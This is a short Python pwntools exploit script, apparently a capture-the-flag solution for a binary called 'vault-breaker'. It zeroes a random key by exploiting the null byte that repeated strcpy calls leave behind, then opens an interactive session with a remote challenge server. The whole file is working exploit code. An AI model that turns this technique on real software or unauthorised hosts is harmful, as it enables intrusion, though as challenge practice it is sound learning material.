#!/usr/bin/env python3

from pwn import *

# Fix rpath with:
#
# patchelf --remove-rpath ./vault-breaker 
# patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 ./vault-breaker
the_binary = "./vault-breaker"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("138.68.188.223", 32080)
else:
    io = process(the_binary)

# Null out the random_key by walking down a series of strcpy calls (each of which adds a
# null byte to the end).
def new_key_gen(length):
    io.sendlineafter("> ", "1")
    io.sendlineafter(": ", str(length))

for i in reversed(range(0x20)):
    new_key_gen(i)

io.sendlineafter("> ", "2")
io.interactive()

